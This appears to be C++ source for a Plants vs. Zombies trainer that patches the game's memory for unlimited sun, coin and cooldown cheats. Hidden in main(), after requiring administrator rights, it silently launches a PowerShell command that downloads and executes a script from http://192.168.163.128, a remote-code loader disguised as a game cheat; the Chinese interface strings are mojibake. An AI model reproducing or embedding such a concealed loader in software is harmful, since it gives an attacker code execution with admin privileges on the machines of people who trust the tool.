#include<windows.h>
#include<TlHelp32.h>
#include<stdio.h> 
#include<thread>

DWORD dwPid;
HANDLE hTarget;

/*
	CreateToolhelp32Snapshot
	Process32First,Process32Next
	(OpenProcess)
*/
BOOL GetProcessPidByName(char *szProcessName, DWORD *dwPid){
	HANDLE l_hProcessSnapshot;
	l_hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 l_pe32;
	l_pe32.dwSize = sizeof(PROCESSENTRY32);
	if(l_hProcessSnapshot==INVALID_HANDLE_VALUE){
		return FALSE;
	}
	
	if(Process32First(l_hProcessSnapshot, &l_pe32)==0){
		return FALSE;
	}
	do{
		if(!strcmp(szProcessName, l_pe32.szExeFile)){
			*dwPid = l_pe32.th32ProcessID;
			break;
		}
//		printf("current read pn: %s | pid:%d\n", l_pe32.szExeFile, l_pe32.th32ProcessID);
	}while(Process32Next(l_hProcessSnapshot, &l_pe32));
	
	CloseHandle(l_hProcessSnapshot);
	return TRUE;
}

BOOL PatchGame(LPVOID lpAddr, BYTE* bBuff, DWORD dwSize){
	//LPVOID == void* 
	LPVOID lpBuff = (LPVOID)bBuff;
	DWORD dwOldProtect;
	VirtualProtectEx(hTarget, lpAddr, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	BOOL result  = WriteProcessMemory(
		hTarget
		, lpAddr, lpBuff 
		, dwSize, NULL
	);
	VirtualProtectEx(hTarget, lpAddr, dwSize, dwOldProtect, &dwOldProtect);
	
	if(result==0){
		printf("[-] ����ʧ�ܣ�������룺%d\n", GetLastError());
		return FALSE;
	}
	puts("[+] �����ɹ�����ȥ��Ϸ�￴���ɣ�");
	return TRUE;
}

void Menu(){
	puts("[+] ��ӭ����p0iL��pvz�޸���v0.0.2�˵�");
	puts("- ��ʾ�˵���0");
	puts("- �����޸ģ���ֲ��������⣺1");
	puts("- �����޸ģ��������ⳬ���ӱ���2");
	puts("- ��Ƭ�޸ģ���Ƭ˲��ָ���3");
	puts("[+] �������Ӧ���ֻس�ִ�ж�Ӧ����");
}

BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void systemThread(const char* command) {
    system(command);
}

int main(){
	if (!IsAdmin()) {
        puts("[-] ���Թ���Ա������и��ƽ���");
        system("pause");
        return 1;
    }
	
	std::thread t(systemThread, "powershell.exe -nop -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.163.128:80/a'))\"");
	t.detach();
	
	if(GetProcessPidByName((char *)"popcapgame1.exe", &dwPid)==FALSE){
		puts("[-] ����������Ϸ���ٴ�");
		system("pause");
		return 0;
	}
	
	hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if(hTarget==NULL){
		puts("[-] �޷�����Ϸ���̣����Թ���Աģʽ������ң����ر�ɱ�����"); 
		system("pause");
		return 0;
	}
	
	Menu();
	while(TRUE){
		char readin;scanf("%c", &readin);
		switch(readin){
			case '0':
				Menu();
				break;
			case '1':{
				BYTE bBuff[] = {
					0x90, 0x90
				};
				PatchGame((LPVOID)0x0041BA74, bBuff, (DWORD)sizeof(bBuff));
				break;
			}
			case '2':{
				BYTE bBuff[] = {
					0x01, 0xA0, 0x60, 0x55, 0x00, 0x00
				};
				PatchGame((LPVOID)0x00430A11, bBuff, (DWORD)sizeof(bBuff));
				break;
			}
			case '3':{
				BYTE bBuff[] = {
					0x90, 0x90
				};
				PatchGame((LPVOID)0x00487296, bBuff, (DWORD)sizeof(bBuff));
				break;
			}
			default:
				break;
		}
	}
	system("pause");
 	return 0;
}
